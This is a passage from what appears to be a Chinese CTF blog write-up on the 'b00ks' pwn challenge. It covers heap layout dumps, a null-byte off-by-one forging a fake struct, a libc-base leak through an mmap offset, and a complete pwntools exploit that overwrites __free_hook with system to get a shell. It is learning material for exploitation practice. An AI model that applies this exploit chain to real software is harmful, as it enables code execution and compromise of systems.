+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [heap]</span></span><br><span class="line"><span class="number">00005586</span>DF65A130  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">31</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">book1_struct =&gt;	</span><br><span class="line"><span class="number">00005586</span>DF65A140  <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">20</span> A0 <span class="number">65</span> DF <span class="number">86</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>  </span><br><span class="line"><span class="number">00005586</span>DF65A150  B0 A0 <span class="number">65</span> DF <span class="number">86</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  </span><br><span class="line"><span class="number">00005586</span>DF65A160  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">31</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">book2_struct =&gt;		</span><br><span class="line"><span class="number">00005586</span>DF65A170  <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> &lt;=book2_ID 		        <span class="number">10</span> <span class="number">40</span> <span class="number">9</span>B E1 <span class="number">69</span> <span class="number">7</span>F <span class="number">00</span> <span class="number">00</span>  &lt;=book2_name的地址		</span><br><span class="line"><span class="number">00005586</span>DF65A180  <span class="number">10</span> <span class="number">20</span> <span class="number">99</span> E1 <span class="number">69</span> <span class="number">7</span>F <span class="number">00</span> <span class="number">00</span> &lt;=book2_description的地址	<span class="number">00</span> <span class="number">10</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  &lt;=book2description的大小</span><br></pre></td></tr></table></figure>
+<p>PS：book2_struct的地址这样是在book1_struct + 0x30 处的，泄漏了book1_struct的地址，即也泄漏了book2_struct的地址。</p>
+<hr>
+<h3 id="0x05-构造fake-book1-0字节覆盖"><a href="#0x05-构造fake-book1-0字节覆盖" class="headerlink" title="0x05:构造fake_book1  + 0字节覆盖"></a>0x05:构造fake_book1  + 0字节覆盖</h3><p>如果使用Changename函数，AuthorName依旧输入32个字符，那么第33处将会被置\x00，也就是会从上面变成如下所示的状态：  </p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00005586</span>DF1E5040  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  aaaaaaaaaaaaaaaa</span><br><span class="line"><span class="number">00005586</span>DF1E5050  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  aaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line"><span class="number">00005586</span>DF1E5060  <span class="number">00</span> A1 <span class="number">65</span> DF <span class="number">86</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>  &lt;== <span class="comment">/*book1_struct地址的低字节被\x00覆盖*/</span> <span class="number">70</span> A1 <span class="number">65</span> DF <span class="number">86</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>  <span class="comment">//&lt;=book2_struct的地址</span></span><br></pre></td></tr></table></figure>
+<p>本来储存在BOOKS[0]里的book1_struct的地址由0x00005586DF65A140变成0x00005586DF65A100，所以我们应该把book1_description的地址弄得尽量大，这样就能使fake_book1_struct的地址是落在description的范围的，这样我们就能通过改写book1_description来完善这个fake_book1_struct。<br>这里我弄得的book1是128的name，128的description，book1 descriprion的范围是：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00005586</span>DF65A0B0  <span class="number">42</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  B...............	&lt;= book1_description	</span><br><span class="line"><span class="number">00005586</span>DF65A0C0  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A0D0  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A0E0  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A0F0  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A100  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A110  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A120  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// book1_struct的地址被覆盖后，</span></span><br><span class="line"><span class="comment">// 由0x00005586DF65A140变成0x00005586DF65A100，</span></span><br><span class="line"><span class="comment">// 0x00005586DF65A100是在book1_struct的范围内的。</span></span><br></pre></td></tr></table></figure>
+<p>所以我们可以在book1_description里构造一个fake_book1_struct：   </p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payload = 'A'*16*5 + p64(1) + p64(book1_addr+0x30+0x8) + p64(book1_addr+0x30+0x8) + p64(0xffff)</span></span><br><span class="line"><span class="comment">// edit_book('1',payload)</span></span><br><span class="line"></span><br><span class="line"><span class="number">00005586</span>DF65A0A0  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">91</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A0B0  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">00005586</span>DF65A0C0  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">00005586</span>DF65A0D0  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">00005586</span>DF65A0E0  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">00005586</span>DF65A0F0  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  AAAAAAAAAAAAAAAA</span><br><span class="line">fake_book1_struct   ==&gt;</span><br><span class="line"><span class="number">00005586</span>DF65A100  <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> &lt;= fake_book1_ ID	</span><br><span class="line"><span class="number">00005586</span>DF65A108  <span class="number">78</span> A1 <span class="number">65</span> DF <span class="number">86</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> &lt;= fake_book1_name的地址（其实<span class="number">00005586</span>DF65A178里面存放的是book2_name的地址，这个地址很重要，前面说过，mmap映射的地址与libc有固定偏移，这样就可以在打印fake_book1_desciption的时候泄漏book2name的地址，也就是mmap映射的这块） </span><br><span class="line"><span class="number">00005586</span>DF65A110  <span class="number">78</span> A1 <span class="number">65</span> DF <span class="number">86</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> &lt;= fake_book1_desciption的地址（其实<span class="number">00005586</span>DF65A178里面存放的是book2_name的地址，这个地址很重要，前面说过，mmap映射的地址与libc有固定偏移，这样就可以在打印fake_book1_desciption的时候泄漏book2name的地址，也就是mmap映射的这块） </span><br><span class="line"><span class="number">00005586</span>DF65A118  FF FF <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> &lt;= fake_book1_desciption的大小</span><br><span class="line"><span class="number">00005586</span>DF65A120  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br></pre></td></tr></table></figure>
+<p>PS：要先布置好fake_book1_struct，再去0字节覆盖.<br>布置fake_book1_struct要在0字节覆盖前一步完成，先Edit book1再ChangeNmae的话会失败，book1_description里的内容改不了，会出现”Can’t find selected book!”<br>先Edit再Change，Change还没完成（也就是fake_book1_struct还没布置好的时候）就Edit book1的话，会到00005586DF65A100里找ID匹配ID，但这时候，还没布置，里面值是0，ID匹配不上，会报错。</p>
+<hr>
+<h3 id="0x06-leak-book2-name的地址（mmap的区域）"><a href="#0x06-leak-book2-name的地址（mmap的区域）" class="headerlink" title="0x06:leak book2_name的地址（mmap的区域）"></a>0x06:leak book2_name的地址（mmap的区域）</h3><p>Print book1就会泄漏处book2_name的地址，原因前面说啦<br>但是再理一理叭 (〃’▽’〃)<br>现在BOOK1里是如下：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00005586</span>DF1E5060  <span class="number">00</span> A1 <span class="number">65</span> DF <span class="number">86</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>  &lt;= fake_book1_struct的地址 (book1_struct地址的低字节被\x00覆盖)</span><br><span class="line"><span class="number">00005586</span>DF1E5068  <span class="number">70</span> A1 <span class="number">65</span> DF <span class="number">86</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>  &lt;= book2_struct的地址</span><br><span class="line">.........</span><br></pre></td></tr></table></figure>
+<p>fake_book1_struct里如下：  </p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fake_book1_struct   ==&gt;</span><br><span class="line"><span class="number">00005586</span>DF65A100  <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> &lt;= fake_book1_ ID	</span><br><span class="line"><span class="number">00005586</span>DF65A108  <span class="number">78</span> A1 <span class="number">65</span> DF <span class="number">86</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> &lt;= fake_book1_name的地址</span><br><span class="line"><span class="number">00005586</span>DF65A110  <span class="number">78</span> A1 <span class="number">65</span> DF <span class="number">86</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> &lt;= fake_book1_desciption的地址</span><br><span class="line"><span class="number">00005586</span>DF65A118  FF FF <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> &lt;= fake_book1_desciption的大小 ................</span><br></pre></td></tr></table></figure>
+<p>0x00005586DF65A178里如下</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00005586</span>DF65A178  <span class="number">10</span> <span class="number">40</span> <span class="number">9</span>B E1 <span class="number">69</span> <span class="number">7</span>F <span class="number">00</span> <span class="number">00</span>  &lt;=book2_name的地址（mmap映射的区域）</span><br></pre></td></tr></table></figure>
+<p>Print book1 name 或者 description的时候都会泄漏出book2_name的地址</p>
+<hr>
+<h3 id="0x07-触发"><a href="#0x07-触发" class="headerlink" title="0x07 触发"></a>0x07 触发</h3><p>这里通过 调用free函数时，由于__free_hook里面的内容不为NULL，从而执行指向的指令。<br>泄漏出mmap映射的区域之后，就可以通过与libc的固定偏移得到libc的运行基址。<br>进而可以找到free_hook函数的地址，system函数的地址，’/bin/sh’的地址。    </p>
+<p>设置__free_hook里为system的地址   </p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payload = p64(binsh_addr) + p64(free_hook)</span></span><br><span class="line"><span class="comment">// edit_book('1',payload)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_book1_description （book2_struct） ==&gt;</span><br><span class="line"><span class="number">00005586</span>DF65A178  <span class="number">57</span> AD <span class="number">6</span>C <span class="number">80</span> <span class="number">21</span> <span class="number">7</span>F <span class="number">00</span> <span class="number">00</span> &lt;= binsh_addr</span><br><span class="line"><span class="number">00005586</span>DF65A180  A8 <span class="number">47</span> <span class="number">90</span> <span class="number">80</span> <span class="number">21</span> <span class="number">7</span>F <span class="number">00</span> <span class="number">00</span> &lt;=free_hook</span><br></pre></td></tr></table></figure>
+<p>这里就把book2_struct里的book2_description编程了free_hook的地址，等下再edit 2的时候就是在往free里写字。</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payload = p64(system_addr)</span></span><br><span class="line"><span class="comment">// edit_book('2',payload)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">free_hook ==&gt;</span><br><span class="line"><span class="number">00007</span>F21809047A8  <span class="number">90</span> <span class="number">33</span> <span class="number">58</span> <span class="number">80</span> <span class="number">21</span> <span class="number">7</span>F <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
+<p>调用free函数时，由于<strong>free_hook里面的内容不为NULL，从而执行指向的指令。<br>PS这里Delete book1的时候传的参是fake_book1_struct 里的name那个，布置成/bin/sh的地址，调用free的时候，就会把/bin/sh压入栈中，然后</strong>free_hook里不为空且布置成了system函数的地址，所以跳转过去执行system函数，就getshell啦。<br>妙啊 这些内存！(๑′ᴗ‵๑)</p>
+<hr>
+<h3 id="0x08完整exp"><a href="#0x08完整exp" class="headerlink" title="0x08完整exp"></a>0x08完整exp</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span> = process([<span class="string">'./b00ks'</span>],env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">def create_book(name_size,name,des_size,des):</span><br><span class="line">	<span class="built_in">io</span>.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	<span class="built_in">io</span>.sendline(<span class="string">'1'</span>)</span><br><span class="line">	<span class="built_in">io</span>.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	<span class="built_in">io</span>.sendline(name_size)</span><br><span class="line">	<span class="built_in">io</span>.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	<span class="built_in">io</span>.sendline(name)</span><br><span class="line">	<span class="built_in">io</span>.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	<span class="built_in">io</span>.sendline(des_size)</span><br><span class="line">	<span class="built_in">io</span>.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	<span class="built_in">io</span>.sendline(des)</span><br><span class="line"></span><br><span class="line">def delete_book(ID):</span><br><span class="line">#	<span class="built_in">io</span>.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	<span class="built_in">io</span>.sendline(<span class="string">'2'</span>)</span><br><span class="line">	<span class="built_in">io</span>.recv()</span><br><span class="line">	<span class="built_in">io</span>.sendline(ID)</span><br><span class="line"></span><br><span class="line">def edit_book(ID,des):	</span><br><span class="line">#	<span class="built_in">io</span>.recv()</span><br><span class="line">	<span class="built_in">io</span>.sendline(<span class="string">'3'</span>)</span><br><span class="line">	<span class="built_in">io</span>.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	<span class="built_in">io</span>.sendline(ID)</span><br><span class="line">	<span class="built_in">io</span>.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	<span class="built_in">io</span>.sendline(des)</span><br><span class="line"></span><br><span class="line">def print_book():</span><br><span class="line">	<span class="built_in">io</span>.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	<span class="built_in">io</span>.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">def change_name(aut_name):</span><br><span class="line">	<span class="built_in">io</span>.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	<span class="built_in">io</span>.sendline(<span class="string">'5'</span>)</span><br><span class="line">	<span class="built_in">io</span>.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	<span class="built_in">io</span>.sendline(aut_name)</span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">'Enter author name: '</span>)</span><br><span class="line"><span class="built_in">io</span>.sendline(<span class="string">'A'</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">create_book(<span class="string">'128'</span>,<span class="string">'A'</span>,<span class="string">'128'</span>,<span class="string">'B'</span>)</span><br><span class="line">create_book(str(<span class="number">0x21000</span>),<span class="string">'C'</span>,str(<span class="number">0x21000</span>),<span class="string">'D'</span>)</span><br><span class="line"></span><br><span class="line">#leak book1_struct_addr</span><br><span class="line">print_book()</span><br><span class="line">sh = <span class="built_in">io</span>.recv()</span><br><span class="line">book1_addr = u64(sh[<span class="number">69</span>:<span class="number">69</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">"book1_address:"</span> + hex(book1_addr))</span><br><span class="line"></span><br><span class="line">#fake_book1_struct</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">16</span>*<span class="number">5</span> + p64(<span class="number">1</span>) + p64(book1_addr+<span class="number">0x30</span>+<span class="number">0x8</span>) + p64(book1_addr+<span class="number">0x30</span>+<span class="number">0x8</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">edit_book(<span class="string">'1'</span>,payload)</span><br><span class="line"></span><br><span class="line">#fake_book1_struct_addr</span><br><span class="line">change_name(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">#leak book2_name_addr</span><br><span class="line">print_book()</span><br><span class="line">sh = <span class="built_in">io</span>.recv()</span><br><span class="line">book2_name_addr =  u64(sh[<span class="number">12</span>:<span class="number">18</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">"book2_name_addr:"</span> + hex(book2_name_addr))</span><br><span class="line"></span><br><span class="line">#libcbase</span><br><span class="line">offset = <span class="number">0x7f69e1992000</span> - <span class="number">0x7f69e13ea000</span></span><br><span class="line">mmap = book2_name_addr - <span class="number">0x22010</span></span><br><span class="line">libcbase = mmap - offset</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">"libcbase:"</span> + hex(libcbase))</span><br><span class="line">#other <span class="function"><span class="keyword">function</span> <span class="title">addr</span></span></span><br><span class="line"><span class="function"><span class="title">system_addr</span> = <span class="title">libc.symbols</span>['<span class="title">system</span>'] + <span class="title">libcbase</span></span></span><br><span class="line"><span class="function"><span class="title">binsh_addr</span> = <span class="title">libc.search</span><span class="params">('/bin/sh')</span></span>.<span class="built_in">next</span>() + libcbase</span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>] + libcbase</span><br><span class="line"></span><br><span class="line">payload = p64(binsh_addr) + p64(free_hook)</span><br><span class="line">edit_book(<span class="string">'1'</span>,payload)</span><br><span class="line">payload = p64(system_addr)</span><br><span class="line">edit_book(<span class="string">'2'</span>,payload)</span><br><span class="line">delete_book(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.interactive()</span><br></pre></td></tr></table></figure>
+<p>啊，弄完了，开心 ٩(๑&gt;◡&lt;๑)۶ </p>
+<hr>
+<h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><p>几个点要注意一下   </p>
+<ul>
+<li>my_read函数存在null byte off-by-one漏洞</li>
+<li>泄漏book1_struct的地址，内存布局，刚好能覆盖那个\x00</li>
+<li>应该在哪儿伪造fake_book1_struct，\x00覆盖book1_struct地址的最低一个字节，确保落在book1_description里</li>
+<li>mmap与libc有固定偏移</li>
+<li>触发条件，__free_hook里面的内容不为NULL，从而执行指向的指令</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/01/7.posion_null_byte/" rel="next" title="7.posion_null_byte">
+                <i class="fa fa-chevron-left"></i> 7.posion_null_byte
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/09/04/%E5%AE%89%E8%A3%85pytorch%20tensorflow/" rel="prev" title="安装pytorch和tensorflow">
+                安装pytorch和tensorflow <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">ha2</p>
